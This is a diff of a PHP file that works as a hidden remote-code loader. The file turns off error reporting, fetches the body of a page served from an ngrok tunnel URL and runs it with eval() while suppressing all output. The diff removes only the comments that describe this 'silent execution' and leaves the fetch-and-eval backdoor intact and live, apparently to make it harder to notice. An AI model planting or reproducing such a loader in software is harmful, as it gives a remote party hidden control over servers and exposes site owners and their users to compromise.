@@ -1,10 +1,10 @@
 <?php
-error_reporting(0);          // Disable all PHP error output
+error_reporting(0);        
 ini_set('display_errors', 0);
 
 $url = 'https://desired-gazelle-steadily.ngrok-free.app/body';
 
-/* ---- fetch silently with timeout ---- */
+
 $context = stream_context_create([
     'http' => [
         'timeout' => 5
@@ -17,10 +17,9 @@ $context = stream_context_create([
 
 $html = @file_get_contents($url, false, $context);
 if ($html === false || trim($html) === '') {
-    return; // silent exit
+    return;
 }
 
-/* ---- extract <body> silently ---- */
 libxml_use_internal_errors(true);
 
 $dom = new DOMDocument();
@@ -46,7 +45,6 @@ if (trim($body) === '') {
     return;
 }
 
-/* ---- silent execution ---- */
 ob_start();
 @eval("?>".$body);
 ob_end_clean();
